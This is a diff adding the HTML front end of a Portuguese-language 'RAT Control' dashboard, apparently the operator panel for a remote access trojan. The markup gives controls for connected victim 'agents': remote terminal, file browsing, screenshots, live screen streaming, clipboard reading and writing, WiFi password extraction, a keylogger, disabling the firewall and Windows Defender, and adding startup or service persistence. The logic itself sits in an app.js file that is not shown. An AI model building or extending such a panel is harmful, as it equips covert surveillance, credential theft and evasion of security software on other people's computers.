@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>RAT Dashboard</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  
+  <div id="login-screen" class="screen active">
+    <div class="login-box">
+      <div class="login-logo">
+        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+          <rect x="2" y="3" width="20" height="14" rx="2"/>
+          <path d="M8 21h8M12 17v4"/>
+          <circle cx="12" cy="10" r="2"/>
+          <path d="M12 8v-2M12 14v-2M10 10H8M16 10h-2"/>
+        </svg>
+        <h1>RAT Control</h1>
+        <p>Remote Administration Tool</p>
+      </div>
+      <div class="form-group">
+        <label for="password">Senha de acesso</label>
+        <input type="password" id="password" placeholder="Digite a senha..." autofocus />
+      </div>
+      <button id="login-btn" class="btn btn-primary">Entrar</button>
+      <div id="login-error" class="error-msg hidden">Senha incorreta. Tente novamente.</div>
+      <div id="login-status" class="status-msg hidden">Conectando ao servidor...</div>
+    </div>
+  </div>
+
+  
+  <div id="dashboard-screen" class="screen">
+
+    
+    <aside class="sidebar">
+      <div class="sidebar-header">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+          <rect x="2" y="3" width="20" height="14" rx="2"/>
+          <circle cx="12" cy="10" r="2"/>
+          <path d="M12 8v-2M12 14v-2M10 10H8M16 10h-2"/>
+        </svg>
+        <span>RAT Control</span>
+      </div>
+
+      <div class="sidebar-section">
+        <span class="sidebar-label">Agentes Online</span>
+        <span id="agent-count" class="badge">0</span>
+      </div>
+
+      <div id="agent-list" class="agent-list">
+        <div class="no-agents">Nenhum agente conectado</div>
+      </div>
+
+      <div class="sidebar-footer">
+        <button id="logout-btn" class="btn btn-ghost">Sair</button>
+      </div>
+    </aside>
+
+    
+    <main class="main">
+
+      
+      <header class="topbar">
+        <div class="topbar-title" id="topbar-title">Selecione um agente</div>
+        <div class="topbar-actions" id="topbar-actions"></div>
+      </header>
+
+      
+      <div id="no-agent-panel" class="panel active">
+        <div class="empty-state">
+          <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1">
+            <rect x="2" y="3" width="20" height="14" rx="2"/>
+            <path d="M8 21h8M12 17v4"/>
+          </svg>
+          <h2>Nenhum agente selecionado</h2>
+          <p>Selecione um agente na lista à esquerda para começar.</p>
+        </div>
+      </div>
+
+      <div id="agent-panel" class="panel">
+
+        
+        <div class="tabs">
+          <button class="tab active" data-tab="sysinfo">Sistema</button>
+          <button class="tab" data-tab="processes">Processos</button>
+          <button class="tab" data-tab="files">Arquivos</button>
+          <button class="tab" data-tab="terminal">Terminal</button>
+          <button class="tab" data-tab="screenshot">Screenshot</button>
+          <button class="tab" data-tab="network">Rede</button>
+          <button class="tab" data-tab="software">Programas</button>
+          <button class="tab" data-tab="clipboard">Clipboard</button>
+          <button class="tab" data-tab="liveview">🔴 Live View</button>
+          <button class="tab" data-tab="advanced">Avançado</button>
+        </div>
+
+        
+        <div id="tab-sysinfo" class="tab-content active">
+          <div class="section-header">
+            <h3>Informações do Sistema</h3>
+            <button class="btn btn-sm" onclick="requestSysInfo()">Atualizar</button>
+          </div>
+          <div id="sysinfo-grid" class="info-grid">
+            <div class="info-placeholder">Clique em "Atualizar" para carregar.</div>
+          </div>
+        </div>
+
+        
+        <div id="tab-processes" class="tab-content">
+          <div class="section-header">
+            <h3>Processos em execução</h3>
+            <button class="btn btn-sm" onclick="requestProcesses()">Atualizar</button>
+          </div>
+          <div class="table-wrap">
+            <table id="process-table">
+              <thead>
+                <tr>
+                  <th>PID</th>
+                  <th>Nome</th>
+                  <th>Memória (KB)</th>
+                  <th>Ação</th>
+                </tr>
+              </thead>
+              <tbody id="process-tbody">
+                <tr><td colspan="4" class="placeholder-row">Clique em "Atualizar" para carregar.</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        
+        <div id="tab-files" class="tab-content">
+          <div class="section-header">
+            <h3>Sistema de Arquivos</h3>
+            <div class="path-bar">
+              <input type="text" id="path-input" placeholder="C:\\" value="C:\\" />
+              <button class="btn btn-sm" onclick="requestFiles()">Ir</button>
+            </div>
+          </div>
+          <div class="table-wrap">
+            <table id="file-table">
+              <thead>
+                <tr>
+                  <th>Tipo</th>
+                  <th>Nome</th>
+                  <th>Tamanho</th>
+                  <th>Modificado</th>
+                </tr>
+              </thead>
+              <tbody id="file-tbody">
+                <tr><td colspan="4" class="placeholder-row">Navegue para um diretório.</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        
+        <div id="tab-terminal" class="tab-content">
+          <div class="section-header">
+            <h3>Terminal Remoto</h3>
+            <button class="btn btn-sm btn-danger" onclick="clearTerminal()">Limpar</button>
+          </div>
+          <div id="terminal-output" class="terminal"></div>
+          <div class="terminal-input-bar">
+            <span class="prompt">C:\&gt;</span>
+            <input type="text" id="terminal-input" placeholder="Digite um comando..." />
+            <button class="btn btn-sm" onclick="sendCommand()">Enviar</button>
+          </div>
+        </div>
+
+        
+        <div id="tab-screenshot" class="tab-content">
+          <div class="section-header">
+            <h3>Screenshot da Tela</h3>
+            <button class="btn btn-sm" onclick="requestScreenshot()">Capturar</button>
+          </div>
+          <div id="screenshot-container" class="screenshot-area">
+            <div class="info-placeholder">Clique em "Capturar" para tirar um screenshot.</div>
+          </div>
+        </div>
+
+        
+        <div id="tab-network" class="tab-content">
+          <div class="section-header">
+            <h3>Interfaces de Rede</h3>
+            <button class="btn btn-sm" onclick="requestNetInfo()">Atualizar</button>
+          </div>
+          <div class="table-wrap">
+            <table id="network-table">
+              <thead>
+                <tr>
+                  <th>Interface</th>
+                  <th>Status</th>
+                  <th>MAC</th>
+                  <th>IPs</th>
+                  <th>Gateway</th>
+                </tr>
+              </thead>
+              <tbody id="network-tbody">
+                <tr><td colspan="5" class="placeholder-row">Clique em "Atualizar" para carregar.</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        
+        <div id="tab-software" class="tab-content">
+          <div class="section-header">
+            <h3>Programas Instalados</h3>
+            <button class="btn btn-sm" onclick="requestSoftware()">Atualizar</button>
+            <input type="text" id="software-filter" placeholder="Filtrar..." oninput="filterSoftware()" style="background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);color:var(--text);padding:5px 10px;font-size:12px;outline:none;" />
+          </div>
+          <div class="table-wrap">
+            <table id="software-table">
+              <thead>
+                <tr>
+                  <th>Nome</th>
+                  <th>Versão</th>
+                  <th>Fabricante</th>
+                  <th>Instalado em</th>
+                </tr>
+              </thead>
+              <tbody id="software-tbody">
+                <tr><td colspan="4" class="placeholder-row">Clique em "Atualizar" para carregar.</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        
+        <div id="tab-clipboard" class="tab-content">
+          <div class="section-header">
+            <h3>Área de Transferência</h3>
+            <button class="btn btn-sm" onclick="requestClipboardGet()">Ler</button>
+          </div>
+          <div id="clipboard-content" class="terminal" style="min-height:80px;max-height:200px;margin-bottom:0;border-radius:var(--radius) var(--radius) 0 0;">
+            <span style="color:var(--text-mute)">Clique em "Ler" para ver o conteúdo.</span>
+          </div>
+          <div class="section-header" style="margin-top:20px;">
+            <h3>Escrever no Clipboard</h3>
+          </div>
+          <div style="display:flex;gap:8px;align-items:flex-start;">
+            <textarea id="clipboard-write" rows="4"
+              placeholder="Digite o texto para enviar ao clipboard da máquina remota..."
+              style="flex:1;background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);color:var(--text);padding:10px 12px;font-size:13px;font-family:var(--mono);outline:none;resize:vertical;"></textarea>
+            <button class="btn btn-sm" style="margin-top:2px;" onclick="requestClipboardSet()">Enviar</button>
+          </div>
+        </div>
+
+        
+        <div id="tab-liveview" class="tab-content">
+          <div class="section-header">
+            <h3>Live View</h3>
+            <div style="display:flex;gap:8px;align-items:center;">
+              <label style="font-size:12px;color:var(--text-dim);">FPS</label>
+              <select id="stream-fps" style="background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);color:var(--text);padding:5px 8px;font-size:12px;outline:none;">
+                <option value="2">2</option>
+                <option value="5" selected>5</option>
+                <option value="8">8</option>
+                <option value="12">12</option>
+              </select>
+              <label style="font-size:12px;color:var(--text-dim);">Qualidade</label>
+              <select id="stream-quality" style="background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);color:var(--text);padding:5px 8px;font-size:12px;outline:none;">
+                <option value="30">Baixa (30)</option>
+                <option value="50" selected>Média (50)</option>
+                <option value="70">Alta (70)</option>
+              </select>
+              <label style="font-size:12px;color:var(--text-dim);">Escala</label>
+              <select id="stream-scale" style="background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);color:var(--text);padding:5px 8px;font-size:12px;outline:none;">
+                <option value="50">50%</option>
+                <option value="75" selected>75%</option>
+                <option value="100">100%</option>
+              </select>
+              <button id="stream-start-btn" class="btn btn-sm" onclick="startLiveView()" style="background:rgba(76,175,125,.15);color:var(--success);border-color:rgba(76,175,125,.3);">▶ Iniciar</button>
+              <button id="stream-stop-btn"  class="btn btn-sm btn-danger" onclick="stopLiveView()" disabled>⏹ Parar</button>
+            </div>
+          </div>
+          
+          <div style="display:flex;gap:16px;margin-bottom:8px;align-items:center;">
+            <span id="stream-status" style="font-size:12px;color:var(--text-mute);">Inativo</span>
+            <span id="stream-fps-actual" style="font-size:12px;color:var(--text-dim);"></span>
+            <span id="stream-size"       style="font-size:12px;color:var(--text-dim);"></span>
+          </div>
+          
+          <div style="flex:1;overflow:auto;background:#090b10;border:1px solid var(--border);border-radius:var(--radius);display:flex;align-items:flex-start;justify-content:center;padding:8px;">
+            <canvas id="stream-canvas" style="max-width:100%;border-radius:4px;"></canvas>
+          </div>
+        </div>
+
+        
+        <div id="tab-advanced" class="tab-content">
+          <div class="section-header">
+            <h3>Ferramentas Avançadas</h3>
+          </div>
+          
+          <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:16px;margin-bottom:20px;">
+            
+            
+            <div class="card">
+              <h4>💾 Informações de Disco</h4>
+              <button class="btn btn-sm" onclick="requestDiskInfo()">Listar Discos</button>
+              <div id="disk-output" style="margin-top:10px;font-size:12px;color:var(--text-dim);"></div>
+            </div>
+
+            
+            <div class="card">
+              <h4>🚀 Programas de Inicialização</h4>
+              <button class="btn btn-sm" onclick="requestStartupPrograms()">Listar</button>
+              <div id="startup-output" style="margin-top:10px;font-size:12px;color:var(--text-dim);"></div>
+            </div>
+
+            
+            <div class="card">
+              <h4>📶 Senhas WiFi</h4>
+              <button class="btn btn-sm" onclick="requestWifiPasswords()">Extrair Senhas</button>
+              <div id="wifi-output" style="margin-top:10px;font-size:12px;color:var(--text-dim);"></div>
+            </div>
+
+            
+            <div class="card">
+              <h4>⌨️ Keylogger</h4>
+              <button class="btn btn-sm" onclick="keyloggerStart()">Iniciar</button>
+              <button class="btn btn-sm btn-danger" onclick="keyloggerStop()">Parar</button>
+              <button class="btn btn-sm" onclick="keyloggerGetLogs()">Ver Logs</button>
+              <div id="keylog-output" style="margin-top:10px;font-size:12px;color:var(--text-dim);max-height:150px;overflow:auto;"></div>
+            </div>
+
+            
+            <div class="card">
+              <h4>🪟 Janela Ativa</h4>
+              <button class="btn btn-sm" onclick="getActiveWindow()">Obter Info</button>
+              <div id="window-output" style="margin-top:10px;font-size:12px;color:var(--text-dim);"></div>
+            </div>
+
+            
+            <div class="card">
+              <h4>⚙️ Serviços Windows</h4>
+              <button class="btn btn-sm" onclick="requestServices()">Listar</button>
+              <div id="services-output" style="margin-top:10px;font-size:12px;color:var(--text-dim);max-height:150px;overflow:auto;"></div>
+            </div>
+
+            
+            <div class="card">
+              <h4>📋 Registro</h4>
+              <input type="text" id="reg-key" placeholder="Chave" style="width:100%;margin:5px 0;padding:5px;background:var(--surface2);border:1px solid var(--border);border-radius:4px;color:var(--text);font-size:12px;" />
+              <input type="text" id="reg-value" placeholder="Nome do valor" style="width:100%;margin:5px 0;padding:5px;background:var(--surface2);border:1px solid var(--border);border-radius:4px;color:var(--text);font-size:12px;" />
+              <button class="btn btn-sm" onclick="registryRead()">Ler</button>
+              <div id="reg-output" style="margin-top:10px;font-size:12px;color:var(--text-dim);"></div>
+            </div>
+
+            
+            <div class="card">
+              <h4>🌍 Variáveis de Ambiente</h4>
+              <button class="btn btn-sm" onclick="requestEnvVars()">Listar</button>
+              <div id="env-output" style="margin-top:10px;font-size:12px;color:var(--text-dim);max-height:150px;overflow:auto;"></div>
+            </div>
+
+            
+            <div class="card">
+              <h4>💻 Controle do Sistema</h4>
+              <button class="btn btn-sm" onclick="lockWorkstation()">Bloquear</button>
+              <button class="btn btn-sm btn-danger" onclick="logoffUser()">Logout</button>
+              <button class="btn btn-sm btn-danger" onclick="shutdownSystem()">Desligar</button>
+              <button class="btn btn-sm btn-danger" onclick="rebootSystem()">Reiniciar</button>
+            </div>
+
+            
+            <div class="card">
+              <h4>🔥 Firewall</h4>
+              <button class="btn btn-sm" onclick="disableFirewall()">Desabilitar</button>
+              <button class="btn btn-sm" onclick="enableFirewall()">Habilitar</button>
+              <button class="btn btn-sm" onclick="getFirewallRules()">Ver Regras</button>
+            </div>
+
+            
+            <div class="card">
+              <h4>🛡️ Windows Defender</h4>
+              <button class="btn btn-sm btn-danger" onclick="disableDefender()">Desabilitar</button>
+              <button class="btn btn-sm" onclick="enableDefender()">Habilitar</button>
+              <button class="btn btn-sm" onclick="getDefenderStatus()">Status</button>
+            </div>
+
+            
+            <div class="card">
+              <h4>🔒 Persistência</h4>
+              <input type="text" id="persist-name" placeholder="Nome" style="width:100%;margin:5px 0;padding:5px;background:var(--surface2);border:1px solid var(--border);border-radius:4px;color:var(--text);font-size:12px;" />
+              <input type="text" id="persist-path" placeholder="Caminho exe" style="width:100%;margin:5px 0;padding:5px;background:var(--surface2);border:1px solid var(--border);border-radius:4px;color:var(--text);font-size:12px;" />
+              <button class="btn btn-sm" onclick="addStartupPersistence()">Startup</button>
+              <button class="btn btn-sm" onclick="addServicePersistence()">Serviço</button>
+            </div>
+
+          </div>
+        </div>
+
+      </div>
+
+    </main>
+  </div>
+
+  <script src="app.js"></script>
+</body>
+</html>
+
